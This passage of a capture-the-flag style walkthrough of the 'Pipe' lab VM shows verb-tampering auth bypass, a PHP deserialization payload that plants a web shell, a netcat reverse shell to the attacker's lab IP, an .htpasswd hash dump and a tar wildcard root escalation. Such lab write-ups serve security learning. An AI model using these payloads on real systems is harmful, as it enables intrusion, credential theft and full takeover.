</span><span class='line'>        <span class="k">eval</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\$</span><span class="s2">str = </span><span class="se">\&quot;</span><span class="si">$str\</span><span class="s2">&quot;</span><span class="p">;</span><span class="s2">&quot;);</span>
</span><span class='line'><span class="s2">        echo </span><span class="si">$str</span><span class="s2">;</span>
</span><span class='line'><span class="s2">    }</span>
</span><span class='line'>
</span><span class='line'><span class="s2">    public function __destruct()</span>
</span><span class='line'><span class="s2">    {</span>
</span><span class='line'><span class="s2"> file_put_contents(</span><span class="si">$this-&gt;filename</span><span class="s2">, </span><span class="si">$this-&gt;data</span><span class="s2">, FILE_APPEND);         // &lt;== Here we can write any code into any file</span>
</span><span class='line'><span class="s2">    }</span>
</span><span class='line'><span class="s2">}</span>
</span><span class='line'><span class="s2">\?&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>Both <code>nmap</code> and <code>nikto</code> results show us that <code>index.php</code> exists under the root path and it requires Basic authentication to access this page.</p>

<p>There is one method can be used to test if the authentication can be bypassed called <code>http method tamper</code> (first appears in 2004, <a href="https://bz.apache.org/bugzilla/show_bug.cgi?id=28778">https://bz.apache.org/bugzilla/show_bug.cgi?id=28778</a>) and Nmap provides a <a href="https://nmap.org/nsedoc/scripts/http-method-tamper.html" title="NMAP script: HTTP method tamper">script</a> to auto-test it.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/the_pipe# nmap -p <span class="m">80</span> --script http-method-tamper --script-args <span class="s1">&#39;http-method-tamper.paths={/index.php}&#39;</span> 10.1.1.143
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.49BETA5 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2015-11-20 21:57 EST
</span><span class='line'>Nmap scan report <span class="k">for</span> 10.1.1.143
</span><span class='line'>Host is up <span class="o">(</span>0.00024s latency<span class="o">)</span>.
</span><span class='line'>PORT   STATE SERVICE
</span><span class='line'>80/tcp open  http
</span><span class='line'><span class="p">|</span> http-method-tamper:
</span><span class='line'><span class="p">|</span>   VULNERABLE:
</span><span class='line'><span class="p">|</span>   Authentication bypass by HTTP verb tampering
</span><span class='line'><span class="p">|</span>     State: VULNERABLE <span class="o">(</span>Exploitable<span class="o">)</span>
</span><span class='line'><span class="p">|</span>       This web server contains password protected resources vulnerable to authentication bypass
</span><span class='line'><span class="p">|</span>       vulnerabilities via HTTP verb tampering. This is often found in web servers that only limit access to the
</span><span class='line'><span class="p">|</span>        common HTTP methods and in misconfigured .htaccess files.
</span><span class='line'><span class="p">|</span>
</span><span class='line'><span class="p">|</span>     Extra information:
</span><span class='line'><span class="p">|</span>
</span><span class='line'><span class="p">|</span>   URIs suspected to be vulnerable to HTTP verb tampering:
</span><span class='line'><span class="p">|</span>     /index.php <span class="o">[</span>POST<span class="o">]</span>
</span><span class='line'><span class="p">|</span>
</span><span class='line'><span class="p">|</span>     References:
</span><span class='line'><span class="p">|</span>       https://www.owasp.org/index.php/Testing_for_HTTP_Methods_and_XST_%28OWASP-CM-008%29
</span><span class='line'><span class="p">|</span>       http://capec.mitre.org/data/definitions/274.html
</span><span class='line'><span class="p">|</span>       http://www.imperva.com/resources/glossary/http_verb_tampering.html
</span><span class='line'><span class="p">|</span>_      http://www.mkit.com.ar/labs/htexploit/
</span><span class='line'>MAC Address: 00:0C:29:64:39:5E <span class="o">(</span>VMware<span class="o">)</span>
</span><span class='line'>
</span><span class='line'>Nmap <span class="k">done</span>: <span class="m">1</span> IP address <span class="o">(</span><span class="m">1</span> host up<span class="o">)</span> scanned in 0.91 seconds
</span></code></pre></td></tr></table></div></figure>


<p>It is vulnerable to POST method, so now I start up burp proxy to bypass the authentication and got the protected page:</p>

<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/pipe/1.png"></p>

<p>Bingo! Next we will check the source code:</p>

<figure class='code'><figcaption><span>index.php.txt  (index.php.txt)</span> <a href='http://f4l13n5n0w.github.io/downloads/code/index.php.txt'>download</a></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;</span><span class="nx">html</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">head</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">meta</span> <span class="nx">http</span><span class="o">-</span><span class="nx">equiv</span><span class="o">=</span><span class="s2">&quot;Content-Type&quot;</span> <span class="nx">content</span><span class="o">=</span><span class="s2">&quot;text/html; charset=UTF-8&quot;</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">script</span> <span class="nx">src</span><span class="o">=</span><span class="s2">&quot;scriptz/php.js&quot;</span><span class="o">&gt;&lt;/</span><span class="nx">script</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
</span><span class='line'><span class="k">function</span> <span class="nf">submit_form</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'><span class="k">var</span> <span class="nx">object</span> <span class="o">=</span> <span class="nb">serialize</span><span class="p">({</span><span class="nx">id</span><span class="o">:</span> <span class="mi">1</span><span class="p">,</span> <span class="nx">firstname</span><span class="o">:</span> <span class="s1">&#39;Rene&#39;</span><span class="p">,</span> <span class="nx">surname</span><span class="o">:</span> <span class="s1">&#39;Margitte&#39;</span><span class="p">,</span> <span class="nx">artwork</span><span class="o">:</span> <span class="s1">&#39;The Treachery of Images&#39;</span><span class="p">});</span>
</span><span class='line'><span class="nx">object</span> <span class="o">=</span> <span class="nx">object</span><span class="o">.</span><span class="nb">substr</span><span class="p">(</span><span class="nx">object</span><span class="o">.</span><span class="nx">indexOf</span><span class="p">(</span><span class="s2">&quot;{&quot;</span><span class="p">),</span><span class="nx">object</span><span class="o">.</span><span class="nx">length</span><span class="p">);</span>
</span><span class='line'><span class="nx">object</span> <span class="o">=</span> <span class="s2">&quot;O:4:</span><span class="se">\&quot;</span><span class="s2">Info</span><span class="se">\&quot;</span><span class="s2">:4:&quot;</span> <span class="o">+</span> <span class="nx">object</span><span class="p">;</span>
</span><span class='line'><span class="nx">document</span><span class="o">.</span><span class="nx">forms</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="nx">param</span><span class="o">.</span><span class="nx">value</span> <span class="o">=</span> <span class="nx">object</span><span class="p">;</span>
</span><span class='line'><span class="nx">document</span><span class="o">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">&#39;info_form&#39;</span><span class="p">)</span><span class="o">.</span><span class="nx">submit</span><span class="p">();</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="o">&lt;/</span><span class="nx">script</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">title</span><span class="o">&gt;</span><span class="nx">The</span> <span class="nx">Treachery</span> <span class="nx">of</span> <span class="nx">Images</span><span class="o">&lt;/</span><span class="nx">title</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;/</span><span class="nx">head</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">h1</span><span class="o">&gt;&lt;</span><span class="nx">i</span><span class="o">&gt;</span><span class="nx">The</span> <span class="nx">Treachery</span> <span class="nx">of</span> <span class="nx">Images</span><span class="o">&lt;/</span><span class="nx">i</span><span class="o">&gt;&lt;/</span><span class="nx">h1</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">hr</span> <span class="o">/&gt;</span>
</span><span class='line'><span class="nx">From</span> <span class="nx">Wikipedia</span><span class="p">,</span> <span class="nx">the</span> <span class="nx">free</span> <span class="nx">encyclopedia</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">br</span> <span class="o">/&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">br</span> <span class="o">/&gt;</span>
</span><span class='line'><span class="nx">The</span> <span class="nx">Treachery</span> <span class="nx">of</span> <span class="nx">Images</span> <span class="p">(</span><span class="nx">French</span><span class="o">:</span> <span class="nx">La</span> <span class="nx">trahison</span> <span class="nx">des</span> <span class="nx">images</span><span class="p">,</span> <span class="mi">1928</span><span class="nx">–29</span><span class="p">,</span> <span class="nx">sometimes</span> <span class="nx">translated</span> <span class="k">as</span> <span class="nx">The</span> <span class="nx">Treason</span> <span class="nx">of</span> <span class="nx">Images</span><span class="p">)</span> <span class="nx">is</span> <span class="nx">a</span> <span class="nx">painting</span> <span class="nx">by</span> <span class="nx">the</span> <span class="nx">Belgian</span> <span class="nx">surrealist</span> <span class="nx">painter</span> <span class="nx">René</span> <span class="nx">Magritte</span><span class="p">,</span> <span class="nx">painted</span> <span class="nx">when</span> <span class="nx">Magritte</span> <span class="nx">was</span> <span class="mi">30</span> <span class="nx">years</span> <span class="nx">old</span><span class="o">.</span> <span class="nx">The</span> <span class="nx">picture</span> <span class="nx">shows</span> <span class="nx">a</span> <span class="nx">pipe</span><span class="o">.</span> <span class="nx">Below</span> <span class="nx">it</span><span class="p">,</span> <span class="nx">Magritte</span> <span class="nx">painted</span><span class="p">,</span> <span class="s2">&quot;Ceci n&#39;est pas une pipe.&quot;</span> <span class="p">[</span><span class="nx">sə</span><span class="o">.</span><span class="nx">si</span> <span class="nx">ne</span> <span class="nx">paz‿yn</span> <span class="nx">pip</span><span class="p">],</span> <span class="nx">French</span> <span class="k">for</span> <span class="s2">&quot;This is not a pipe.&quot;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'><span class="s2">&quot;The famous pipe. How people reproached me for it! And yet, could you stuff my pipe? No, it&#39;s just a representation, is it not? So if I had written on my picture &#39;This is a pipe&#39;, I&#39;d have been lying!&quot;</span>
</span><span class='line'><span class="o">&lt;/</span><span class="nx">p</span><span class="o">&gt;</span>
</span><span class='line'><span class="nx">His</span> <span class="nx">statement</span> <span class="nx">is</span> <span class="nx">taken</span> <span class="nx">to</span> <span class="nx">mean</span> <span class="nx">that</span> <span class="nx">the</span> <span class="nx">painting</span> <span class="nx">itself</span> <span class="nx">is</span> <span class="k">not</span> <span class="nx">a</span> <span class="nx">pipe</span><span class="o">.</span> <span class="nx">The</span> <span class="nx">painting</span> <span class="nx">is</span> <span class="nx">merely</span> <span class="nx">an</span> <span class="nx">image</span> <span class="nx">of</span> <span class="nx">a</span> <span class="nx">pipe</span><span class="o">.</span> <span class="nx">Hence</span><span class="p">,</span> <span class="nx">the</span> <span class="nx">description</span><span class="p">,</span> <span class="s2">&quot;this is not a pipe.&quot;</span> <span class="nx">The</span> <span class="nx">theme</span> <span class="nx">of</span> <span class="nx">pipes</span> <span class="nx">with</span> <span class="nx">the</span> <span class="nx">text</span> <span class="s2">&quot;Ceci n&#39;est pas une pipe&quot;</span> <span class="nx">is</span> <span class="nx">extended</span> <span class="nx">in</span> <span class="nx">his</span> <span class="mi">1966</span> <span class="nx">painting</span><span class="p">,</span> <span class="nx">Les</span> <span class="nx">Deux</span> <span class="nx">Mystères</span><span class="o">.</span> <span class="nx">It</span> <span class="nx">is</span> <span class="nx">currently</span> <span class="nx">on</span> <span class="nx">display</span> <span class="nx">at</span> <span class="nx">the</span> <span class="nx">Los</span> <span class="nx">Angeles</span> <span class="nx">County</span> <span class="nx">Museum</span> <span class="nx">of</span> <span class="nx">Art</span><span class="o">.</span>
</span><span class='line'><span class="nx">The</span> <span class="nx">painting</span> <span class="nx">is</span> <span class="nx">sometimes</span> <span class="nx">given</span> <span class="k">as</span> <span class="nx">an</span> <span class="nx">example</span> <span class="nx">of</span> <span class="nx">meta</span> <span class="nx">message</span> <span class="nx">conveyed</span> <span class="nx">by</span> <span class="nx">paralanguage</span><span class="o">.</span> <span class="nx">Compare</span> <span class="nx">with</span> <span class="nx">Korzybski</span><span class="err">&#39;</span><span class="nx">s</span> <span class="s2">&quot;The word is not the thing&quot;</span> <span class="k">and</span> <span class="s2">&quot;The map is not the territory&quot;</span><span class="o">.</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">br</span> <span class="o">/&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">br</span> <span class="o">/&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">center</span><span class="o">&gt;&lt;</span><span class="nx">div</span> <span class="nx">style</span><span class="o">=</span><span class="s2">&quot;width:500px;overflow:hidden;&quot;</span> <span class="o">&gt;</span>
</span><span class='line'>   <span class="o">&lt;</span><span class="nx">img</span> <span class="nx">src</span><span class="o">=</span><span class="s2">&quot;images/pipe.jpg&quot;</span> <span class="nx">width</span><span class="o">=</span><span class="s2">&quot;400px&quot;</span> <span class="nx">height</span><span class="o">=</span><span class="s2">&quot;auto&quot;</span> <span class="nx">border</span><span class="o">=</span><span class="s2">&quot;1&quot;</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;/</span><span class="nx">div</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;</span><span class="nx">form</span> <span class="nx">action</span><span class="o">=</span><span class="s2">&quot;index.php&quot;</span> <span class="nx">id</span><span class="o">=</span><span class="s2">&quot;info_form&quot;</span> <span class="nx">method</span><span class="o">=</span><span class="s2">&quot;POST&quot;</span><span class="o">&gt;</span>
</span><span class='line'>   <span class="o">&lt;</span><span class="nx">input</span> <span class="nx">type</span><span class="o">=</span><span class="s2">&quot;hidden&quot;</span> <span class="nx">name</span><span class="o">=</span><span class="s2">&quot;param&quot;</span> <span class="nx">value</span><span class="o">=</span><span class="s2">&quot;&quot;</span> <span class="o">/&gt;</span>
</span><span class='line'>   <span class="o">&lt;</span><span class="nx">a</span> <span class="nx">href</span><span class="o">=</span><span class="s2">&quot;#&quot;</span> <span class="nx">onclick</span><span class="o">=</span><span class="s2">&quot;submit_form(); return false;&quot;</span><span class="o">&gt;</span><span class="nx">Show</span> <span class="nx">Artist</span> <span class="nx">Info</span><span class="o">.&lt;/</span><span class="nx">a</span><span class="o">&gt;</span>
</span><span class='line'><span class="o">&lt;/</span><span class="nx">form</span><span class="o">&gt;&lt;/</span><span class="nx">center</span><span class="o">&gt;&lt;/</span><span class="nx">html</span><span class="o">&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>It loads <code>scriptz/php.js</code> and there is a link pointing to function <code>submit_form</code> with a hidden value <code>param</code>, then I use burp proxy to check what data will be sent when I click the link <code>Show Artist Info</code>, after URL decoded, I found the following data:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>O:4:"Info":4:{s:2:"id";i:1;s:9:"firstname";s:4:"Rene";s:7:"surname";s:8:"Margitte";s:7:"artwork";s:23:"The Treachery of Images";}</span></code></pre></td></tr></table></div></figure>


<p>After a close look at the source code in <code>php.js</code>, <code>Log.php.BAK</code> and <code>index.php</code>, I can manage to construct the following payload to upload a web shell:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>O:3:"Log":2:{s:8:"filename";s:31:"/var/www/html/scriptz/shell.php";s:4:"data";s:30:"&lt;\?php system($_GET['cmd']); \?>";}</span></code></pre></td></tr></table></div></figure>


<p><img class="left" src="http://f4l13n5n0w.github.io/downloads/pipe/2.png"></p>

<p>Here we can see that <code>shell.php</code> has been created under folder <code>scriptz</code> and now we can run system commands.</p>

<p>The following URL will give us a reverse shell connect back to attacker&rsquo;s port 4444</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>http://10.1.1.143/scriptz/shell.php?cmd=nc+-e+/bin/sh+10.1.1.130+4444</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>root@kali:~/the_pipe# nc -lvnp 4444
</span><span class='line'>listening on [any] 4444 ...
</span><span class='line'>connect to [10.1.1.130] from (UNKNOWN) [10.1.1.143] 33575
</span><span class='line'>id
</span><span class='line'>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</span><span class='line'>pwd
</span><span class='line'>/var/www/html/scriptz
</span><span class='line'>ls -al
</span><span class='line'>total 24
</span><span class='line'>drwxr-xr-x 2 www-data www-data 4096 Nov 22 07:20 .
</span><span class='line'>drwxr-xr-x 4 www-data www-data 4096 Jul  9 13:49 ..
</span><span class='line'>-rw-r--r-- 1 www-data www-data   94 Jul  9 13:51 .htaccess
</span><span class='line'>-rw-r--r-- 1 www-data www-data  474 Jul  6 02:26 log.php.BAK
</span><span class='line'>-rw-r--r-- 1 www-data www-data 3768 Jul  5 19:02 php.js
</span><span class='line'>-rw-r--r-- 1 www-data www-data   35 Nov 22 07:20 shell.php</span></code></pre></td></tr></table></div></figure>


<p>Then using python to jail break the shell and start enumerating</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>python -c "import pty; pty.spawn('/bin/bash');"
</span><span class='line'>www-data@pipe:/var/www/html/scriptz$cd ..
</span><span class='line'>www-data@pipe:/var/www/html$ ls -al
</span><span class='line'>
</span><span class='line'>total 36
</span><span class='line'>drwxr-xr-x 4 www-data www-data 4096 Jul  9 13:49 .
</span><span class='line'>drwxr-xr-x 3 root     root     4096 Jul  5 14:46 ..
</span><span class='line'>-rw-r--r-- 1 www-data www-data  137 Jul  6 02:43 .htaccess
</span><span class='line'>-rw-r--r-- 1 www-data www-data   43 Jul  6 09:33 .htpasswd
</span><span class='line'>drwxr-xr-x 2 www-data www-data 4096 Jul  6 02:53 images
</span><span class='line'>-rw-r--r-- 1 www-data www-data 2801 Jul  9 13:49 index.php
</span><span class='line'>-rw-r--r-- 1 www-data www-data  150 Jul  6 01:50 info.php
</span><span class='line'>-rw-r--r-- 1 www-data www-data  474 Jul  6 03:43 log.php
</span><span class='line'>drwxr-xr-x 2 www-data www-data 4096 Nov 22 07:20 scriptz
</span><span class='line'>www-data@pipe:/var/www/html$ cat  .htpasswd
</span><span class='line'>
</span><span class='line'>rene:$apr1$wfYjXf4U$0ZZ.qhGGrtkOxvKr5WFqX/</span></code></pre></td></tr></table></div></figure>




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@pipe:/home/rene$ ls  -al
</span><span class='line'>
</span><span class='line'>total 24
</span><span class='line'>drwxr-xr-x 3 rene rene 4096 Jul  6 07:42 .
</span><span class='line'>drwxr-xr-x 3 root root 4096 Jul  5 14:09 ..
</span><span class='line'>-rw-r--r-- 1 rene rene  220 Jul  5 14:09 .bash_logout
</span><span class='line'>-rw-r--r-- 1 rene rene 3515 Jul  5 14:09 .bashrc
</span><span class='line'>-rw-r--r-- 1 rene rene  675 Jul  5 14:09 .profile
</span><span class='line'>drwxrwxrwx 2 rene rene 4096 Nov 22 07:38 backup
</span><span class='line'>www-data@pipe:/home/rene$ ls  -al  backup
</span><span class='line'>
</span><span class='line'>total 140
</span><span class='line'>drwxrwxrwx 2 rene rene  4096 Nov 22 07:38 .
</span><span class='line'>drwxr-xr-x 3 rene rene  4096 Jul  6 07:42 ..
</span><span class='line'>-rw-r--r-- 1 rene rene 65404 Nov 22 07:35 backup.tar.gz
</span><span class='line'>-rw-r--r-- 1 rene rene 22959 Nov 22 07:38 sys-11286.BAK
</span><span class='line'>-rw-r--r-- 1 rene rene 23376 Nov 22 07:37 sys-20270.BAK
</span><span class='line'>-rw-r--r-- 1 rene rene 19123 Nov 22 07:36 sys-7508.BAK
</span><span class='line'>www-data@pipe:/home/rene$ ls  -al  backup
</span><span class='line'>
</span><span class='line'>total 156
</span><span class='line'>drwxrwxrwx 2 rene rene  4096 Nov 22 07:39 .
</span><span class='line'>drwxr-xr-x 3 rene rene  4096 Jul  6 07:42 ..
</span><span class='line'>-rw-r--r-- 1 rene rene 65404 Nov 22 07:35 backup.tar.gz
</span><span class='line'>-rw-r--r-- 1 rene rene 22959 Nov 22 07:38 sys-11286.BAK
</span><span class='line'>-rw-r--r-- 1 rene rene 13451 Nov 22 07:39 sys-17501.BAK
</span><span class='line'>-rw-r--r-- 1 rene rene 23376 Nov 22 07:37 sys-20270.BAK
</span><span class='line'>-rw-r--r-- 1 rene rene 19123 Nov 22 07:36 sys-7508.BAK</span></code></pre></td></tr></table></div></figure>


<p>Here we noticed that system doing backup automatically, so I go to check cron entry in <code>/etc/crontab</code>:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@pipe:/home/rene$ cat  /etc/crontab
</span><span class='line'>
</span><span class='line'># /etc/crontab: system-wide crontab
</span><span class='line'># Unlike any other crontab you don't have to run the `crontab'
</span><span class='line'># command to install the new version when you edit this file
</span><span class='line'># and files in /etc/cron.d. These files also have username fields,
</span><span class='line'># that none of the other crontabs do.
</span><span class='line'>
</span><span class='line'>SHELL=/bin/sh
</span><span class='line'>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
</span><span class='line'>
</span><span class='line'># m h dom mon dow user    command
</span><span class='line'>17 *  * * *   root    cd / && run-parts --report /etc/cron.hourly
</span><span class='line'>25 6  * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
</span><span class='line'>47 6  * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
</span><span class='line'>52 6  1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
</span><span class='line'>#
</span><span class='line'>* * * * * root /root/create_backup.sh
</span><span class='line'>*/5 * * * * root /usr/bin/compress.sh</span></code></pre></td></tr></table></div></figure>


<p>Trying to check the script code in both <code>.sh</code> file, but only <code>/usr/bin/compress.sh</code> can be read:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@pipe:/home/rene/backup$ cat /usr/bin/compress.sh
</span><span class='line'>cat /usr/bin/compress.sh
</span><span class='line'>#!/bin/sh
</span><span class='line'>
</span><span class='line'>rm -f /home/rene/backup/backup.tar.gz
</span><span class='line'>cd /home/rene/backup
</span><span class='line'>tar cfz /home/rene/backup/backup.tar.gz *
</span><span class='line'>chown rene:rene /home/rene/backup/backup.tar.gz
</span><span class='line'>rm -f /home/rene/backup/*.BAK</span></code></pre></td></tr></table></div></figure>


<p>Here I noticed that <code>tar</code> is used with wildcard <code>*</code>, which can be exploited to execute arbitrary commands.</p>

<p><a href="http://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt" title="Wildcards exploit">Here</a> is the details about Unix wildcard exploit, the relevant information about <code>tar</code> can be found in point 4.3.</p>

<p>I will use setuid a shell command to get a ROOT shell, first of all, I have to check what kind of shell installed in the server.:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@pipe:/home/rene/backup$ ls -al /bin/*sh
</span><span class='line'>ls -al /bin/*sh
</span><span class='line'>-rwxr-xr-x 1 root root 1029624 Nov 13  2014 /bin/bash
</span><span class='line'>-rwxr-xr-x 1 root root  125400 Nov  8  2014 /bin/dash
</span><span class='line'>lrwxrwxrwx 1 root root       4 Nov 13  2014 /bin/rbash -> bash
</span><span class='line'>lrwxrwxrwx 1 root root       4 Nov  8  2014 /bin/sh -> dash</span></code></pre></td></tr></table></div></figure>


<p>Cool, I found <code>/bin/dash</code> appeared in the list, now I am going to create evil script and ROOT it:</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>www-data@pipe:/home/rene/backup$cd /home/rene/backup
</span><span class='line'>www-data@pipe:/home/rene/backup$echo > --checkpoint=1;
</span><span class='line'>www-data@pipe:/home/rene/backup$echo > --checkpoint-action=exec=sh\ shell.sh;
</span><span class='line'>www-data@pipe:/home/rene/backup$echo 'chmod u+s /bin/dash' > shell.sh
</span><span class='line'>www-data@pipe:/home/rene/backup$echo 'touch /home/rene/backup/done' >> shell.sh
</span><span class='line'>www-data@pipe:/home/rene/backup$cat shell.sh 
</span><span class='line'>chmod u+s /bin/dash
</span><span class='line'>touch /home/rene/backup/done
</span><span class='line'>www-data@pipe:/home/rene/backup$chmod +x shell.sh</span></code></pre></td></tr></table></div></figure>


<p>Now just waiting for couple of minutes and you will find that a new file named <code>done</code> has been created.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
